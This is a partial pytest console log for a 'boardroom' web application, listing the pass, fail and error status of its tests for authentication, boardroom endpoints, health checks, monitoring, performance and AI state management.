============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
collecting ... collected 592 items

tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_success ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_degraded_performance ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_ai_health_check_error_handling ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_active_sessions_success ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_active_sessions_empty ERROR [  0%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_create_session_checkpoint_success ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_create_session_checkpoint_error ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_restore_session_checkpoint_success ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_restore_session_checkpoint_error ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_success ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_default_expiry ERROR [  1%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_cleanup_expired_sessions_error ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_ai_metrics_summary_success ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_get_ai_metrics_summary_error ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndpoints::test_rate_limiting ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_health_check_without_auth ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_active_sessions_without_auth ERROR [  2%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_checkpoint_creation_without_auth ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsAuthentication::test_metrics_summary_without_auth ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndToEnd::test_session_management_workflow ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsEndToEnd::test_health_monitoring_workflow ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_health_check_response_time ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_metrics_summary_response_time ERROR [  3%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_concurrent_requests_handling ERROR [  4%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_session_operations_performance ERROR [  4%]
tests/integration/test_ai_operations_endpoints.py::TestAIOperationsPerformance::test_throughput_under_sustained_load ERROR [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_root_endpoint_standard_format PASSED [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_health_endpoint_standard_format PASSED [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_standard_headers_present FAILED [  4%]
tests/integration/test_api_standards.py::TestAPIStandards::test_api_version_info_endpoint FAILED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_api_standards_documentation PASSED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_error_codes_documentation PASSED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_api_examples_endpoint PASSED [  5%]
tests/integration/test_api_standards.py::TestAPIStandards::test_detailed_health_endpoint FAILED [  5%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_error_response_consistency FAILED [  5%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_validation_error_consistency PASSED [  6%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_cors_headers_present FAILED [  6%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_openapi_spec_available PASSED [  6%]
tests/integration/test_api_standards.py::TestAPIConsistency::test_documentation_pages_accessible PASSED [  6%]
tests/integration/test_api_standards.py::TestRateLimitingStandards::test_rate_limit_headers_present PASSED [  6%]
tests/integration/test_api_standards.py::TestRateLimitingStandards::test_rate_limit_documentation PASSED [  6%]
tests/integration/test_api_standards.py::TestAPIVersioning::test_version_in_url_path PASSED [  7%]
tests/integration/test_api_standards.py::TestAPIVersioning::test_version_header_support FAILED [  7%]
tests/integration/test_api_standards.py::TestAPIVersioning::test_unsupported_version_handling FAILED [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_success ERROR [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_invalid_credentials ERROR [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_wrong_password ERROR [  7%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_inactive_user ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_login_invalid_input ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_success ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_duplicate_email ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_weak_password ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestAuthenticationEndpoints::test_user_register_invalid_input ERROR [  8%]
tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_with_valid_token ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_with_invalid_token ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestTokenValidation::test_protected_endpoint_without_token ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationFlow::test_register_login_flow ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationFlow::test_multiple_login_attempts ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_sql_injection_prevention ERROR [  9%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_xss_prevention_in_registration ERROR [ 10%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_password_not_returned_in_responses ERROR [ 10%]
tests/integration/test_auth_endpoints.py::TestAuthenticationSecurity::test_case_insensitive_email_handling ERROR [ 10%]
tests/integration/test_auth_endpoints.py::TestAuthenticationRateLimiting::test_login_rate_limiting ERROR [ 10%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_success ERROR [ 10%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_unauthorized ERROR [ 10%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_missing_token ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_create_boardroom_invalid_input ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_get_boardroom_success ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_get_boardroom_not_found ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_list_boardrooms_success ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_update_boardroom_success ERROR [ 11%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_update_boardroom_not_owner ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_delete_boardroom_success ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomEndpoints::test_delete_boardroom_not_owner ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_create_session_success ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_get_session_success ERROR [ 12%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_list_sessions_success ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomSessionEndpoints::test_end_session_success ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_admin_can_access_any_boardroom ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_user_cannot_access_private_boardroom ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomPermissions::test_user_can_access_public_boardroom ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomValidation::test_boardroom_name_validation ERROR [ 13%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomValidation::test_boardroom_settings_validation ERROR [ 14%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomErrorHandling::test_database_error_handling ERROR [ 14%]
tests/integration/test_boardroom_endpoints.py::TestBoardroomErrorHandling::test_concurrent_access_handling ERROR [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_database_health_check PASSED [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_redis_health_check FAILED [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_system_resources_health_check PASSED [ 14%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_comprehensive_health_check PASSED [ 15%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_is_ready PASSED [ 15%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_is_alive PASSED [ 15%]
tests/integration/test_health_checks.py::TestHealthCheckService::test_dependencies_status PASSED [ 15%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_initialization PASSED [ 15%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_success PASSED [ 15%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_failure_threshold PASSED [ 16%]
tests/integration/test_health_checks.py::TestCircuitBreaker::test_circuit_breaker_blocks_when_open PASSED [ 16%]
tests/integration/test_health_checks.py::TestRetryManager::test_retry_success_on_first_attempt PASSED [ 16%]
tests/integration/test_health_checks.py::TestRetryManager::test_retry_with_failures PASSED [ 16%]
tests/integration/test_health_checks.py::TestRetryManager::test_retry_max_attempts_exceeded PASSED [ 16%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_basic_health_endpoint FAILED [ 16%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_readiness_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_liveness_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_detailed_health_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_dependencies_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_circuit_breakers_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthEndpoints::test_metrics_endpoint FAILED [ 17%]
tests/integration/test_health_checks.py::TestHealthCaching::test_health_check_caching PASSED [ 18%]
tests/integration/test_health_checks.py::TestExternalAPIHealthCheck::test_external_api_health_check_success FAILED [ 18%]
tests/integration/test_health_checks.py::TestExternalAPIHealthCheck::test_external_api_health_check_failure FAILED [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_healthy ERROR [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_unhealthy_database ERROR [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_root_endpoint ERROR [ 18%]
tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_with_migration_status ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_success ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_empty ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_with_timeframe ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_invalid_timeframe ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_monitoring_health_success ERROR [ 19%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_monitoring_health_degraded ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_record_error_endpoint ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_record_error_endpoint_invalid_data ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_get_system_metrics_success ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_get_application_metrics_success ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_prometheus_metrics_endpoint ERROR [ 20%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_monitoring_endpoints_require_admin ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_monitoring_endpoints_allow_admin ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_health_endpoint_public_access ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_prometheus_metrics_public_access ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_error_summary_service_failure ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_metrics_collection_failure ERROR [ 21%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_health_check_partial_failure ERROR [ 22%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_monitoring_endpoints_response_time ERROR [ 22%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_concurrent_monitoring_requests ERROR [ 22%]
tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_large_error_summary_handling ERROR [ 22%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_agent_initialization_time FAILED [ 22%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_single_query_response_time FAILED [ 22%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_concurrent_queries_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_memory_usage_single_query FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_streaming_response_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_chat_history_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestLangGraphAgentPerformance::test_sustained_load_performance FAILED [ 23%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_agenda_creation_performance ERROR [ 23%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_decision_support_performance ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_minutes_generation_performance ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_concurrent_tool_execution ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_tools_memory_efficiency ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_tool_response_time_consistency ERROR [ 24%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_creation_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_update_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_retrieval_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_concurrent_state_operations PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_checkpoint_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_cleanup_performance PASSED [ 25%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_state_manager_memory_efficiency PASSED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIStateManagerPerformance::test_active_sessions_performance PASSED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_high_concurrency_ai_operations FAILED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_sustained_load_performance FAILED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_resource_exhaustion_handling FAILED [ 26%]
tests/performance/test_ai_operations_performance.py::TestAIOperationsLoadTesting::test_memory_pressure_handling FAILED [ 26%]
tests/performance/test_performance.py::TestAPIPerformance::test_health_endpoint_response_time ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_auth_endpoint_performance ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_boardroom_creation_performance ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_concurrent_health_checks ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[5] ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[10] ERROR [ 27%]
tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[20] ERROR [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_token_creation_performance PASSED [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_token_verification_performance PASSED [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_string_sanitization_performance PASSED [ 28%]
tests/performance/test_performance.py::TestUtilityPerformance::test_dict_sanitization_performance PASSED [ 28%]
tests/performance/test_performance.py::TestDatabaseServicePerformance::test_database_initialization_performance FAILED [ 28%]
tests/performance/test_performance.py::TestDatabaseServicePerformance::test_session_context_manager_performance PASSED [ 29%]
tests/performance/test_performance.py::TestErrorMonitoringPerformance::test_error_recording_performance PASSED [ 29%]
tests/performance/test_performance.py::TestErrorMonitoringPerformance::test_error_summary_performance PASSED [ 29%]
tests/performance/test_performance.py::TestErrorMonitoringPerformance::test_health_status_performance PASSED [ 29%]
tests/performance/test_performance.py::TestMemoryUsage::test_token_creation_memory_usage PASSED [ 29%]
tests/performance/test_performance.py::TestMemoryUsage::test_error_monitoring_memory_usage FAILED [ 29%]
tests/performance/test_performance.py::TestLoadTesting::test_sustained_health_check_load ERROR [ 30%]
tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[5] ERROR [ 30%]
tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[10] ERROR [ 30%]
tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[20] ERROR [ 30%]
tests/performance/test_performance.py::test_performance_baselines_defined PASSED [ 30%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_response_compression PASSED [ 30%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_cache_headers PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_payload_optimization PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestResponseOptimization::test_middleware_cache_integration PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_memory_monitoring PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_resource_cleanup PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_ai_memory_optimization PASSED [ 31%]
tests/performance/test_performance_optimization.py::TestMemoryManagement::test_memory_pressure_handling PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_multi_level_cache_operations PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cache_statistics PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cache_expiration PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cache_eviction PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_predictive_cache_patterns PASSED [ 32%]
tests/performance/test_performance_optimization.py::TestAdvancedCaching::test_cached_decorator PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceIntegration::test_performance_endpoint PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceIntegration::test_memory_optimization_under_load PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceIntegration::test_cache_hit_ratio_target PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_response_time_targets PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_memory_usage_target PASSED [ 33%]
tests/performance/test_performance_optimization.py::TestPerformanceBenchmarks::test_ai_operation_response_time PASSED [ 34%]
tests/performance/test_performance_optimization.py::TestBasicFunctionality::test_health_endpoint PASSED [ 34%]
tests/performance/test_performance_optimization.py::TestBasicFunctionality::test_root_endpoint PASSED [ 34%]
tests/performance/test_performance_optimization.py::TestBasicFunctionality::test_performance_endpoint_availability PASSED [ 34%]
tests/test_basic_infrastructure.py::test_pytest_configuration PASSED     [ 34%]
tests/test_basic_infrastructure.py::test_faker_availability PASSED       [ 34%]
tests/test_basic_infrastructure.py::test_sample_user_data_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_sample_boardroom_data_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_user_factory_fixture PASSED     [ 35%]
tests/test_basic_infrastructure.py::test_boardroom_factory_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_realistic_test_scenario_fixture PASSED [ 35%]
tests/test_basic_infrastructure.py::test_error_response_factory PASSED   [ 35%]
tests/test_basic_infrastructure.py::test_testing_environment_variables PASSED [ 36%]
tests/test_basic_infrastructure.py::test_coverage_configuration PASSED   [ 36%]
tests/test_basic_infrastructure.py::test_async_test_support PASSED       [ 36%]
tests/test_basic_infrastructure.py::test_slow_marker PASSED              [ 36%]
tests/test_basic_infrastructure.py::test_mock_functionality PASSED       [ 36%]
tests/test_basic_infrastructure.py::test_httpx_availability PASSED       [ 36%]
tests/test_basic_infrastructure.py::test_test_settings_fixture PASSED    [ 37%]
tests/test_infrastructure.py::test_database_session_fixture ERROR        [ 37%]
tests/test_infrastructure.py::test_async_client_fixture ERROR            [ 37%]
tests/test_infrastructure.py::test_health_check_endpoint ERROR           [ 37%]
tests/test_infrastructure.py::test_root_endpoint ERROR                   [ 37%]
tests/test_infrastructure.py::test_sample_user_data_fixture PASSED       [ 38%]
tests/test_infrastructure.py::test_sample_boardroom_data_fixture PASSED  [ 38%]
tests/test_infrastructure.py::test_user_factory_fixture PASSED           [ 38%]
tests/test_infrastructure.py::test_boardroom_factory_fixture PASSED      [ 38%]
tests/test_infrastructure.py::test_mock_langfuse_fixture ERROR           [ 38%]
tests/test_infrastructure.py::test_mock_llm_service_fixture ERROR        [ 38%]
tests/test_infrastructure.py::test_realistic_test_scenario_fixture PASSED [ 39%]
tests/test_infrastructure.py::test_performance_fixture_availability PASSED [ 39%]
tests/test_infrastructure.py::test_error_response_factory PASSED         [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_state_manager_initialization PASSED [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_success PASSED [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_already_exists PASSED [ 39%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_conversation_state_error PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_from_memory PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_from_database PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_conversation_state_not_found PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_success PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_locked PASSED [ 40%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_force_update PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_update_conversation_state_not_found PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_create_checkpoint_success PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_from_checkpoint_success PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_from_checkpoint_not_found PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_clear_conversation_state_success PASSED [ 41%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_active_sessions PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_cleanup_expired_states PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_persist_state_placeholder PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_restore_state_placeholder PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_clear_persisted_state_placeholder PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestAIStateManager::test_get_session_context_manager PASSED [ 42%]
tests/unit/test_ai_state_manager.py::TestGlobalStateManager::test_global_instance_exists PASSED [ 43%]
tests/unit/test_ai_state_manager.py::TestGlobalStateManager::test_global_instance_singleton PASSED [ 43%]
tests/unit/test_ai_state_manager.py::TestStateManagerIntegration::test_full_lifecycle PASSED [ 43%]
tests/unit/test_ai_state_manager.py::TestStateManagerIntegration::test_concurrent_access_simulation PASSED [ 43%]
tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_with_default_expiry PASSED [ 43%]
tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_with_custom_expiry PASSED [ 43%]
tests/unit/test_auth_utils.py::TestCreateAccessToken::test_create_access_token_includes_sanitized_jti FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_valid FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_format FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_invalid_signature FAILED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_expired PASSED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_missing_subject PASSED [ 44%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_malformed_jwt PASSED [ 45%]
tests/unit/test_auth_utils.py::TestVerifyToken::test_verify_token_type_validation PASSED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_create_access_token_logs_creation PASSED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_verification FAILED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_invalid_format PASSED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsLogging::test_verify_token_logs_jwt_error FAILED [ 45%]
tests/unit/test_auth_utils.py::TestAuthUtilsIntegration::test_token_roundtrip PASSED [ 46%]
tests/unit/test_auth_utils.py::TestAuthUtilsIntegration::test_different_thread_ids PASSED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_database_service_init PASSED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_success FAILED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_test_environment FAILED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_with_retries FAILED [ 46%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_max_retries_exceeded PASSED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceInitialization::test_initialize_idempotent PASSED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_context_manager PASSED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_initializes_if_needed FAILED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_operational_error_handling FAILED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_sqlalchemy_error_handling FAILED [ 47%]
tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_generic_error_handling FAILED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_healthy FAILED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_with_pool_status PASSED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_unhealthy PASSED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_initializes_if_needed FAILED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceMigrationCheck::test_execute_migration_check_success PASSED [ 48%]
tests/unit/test_database_service.py::TestDatabaseServiceMigrationCheck::test_execute_migration_check_failure PASSED [ 49%]
tests/unit/test_database_service.py::TestDatabaseServiceUserOperations::test_create_user_success PASSED [ 49%]
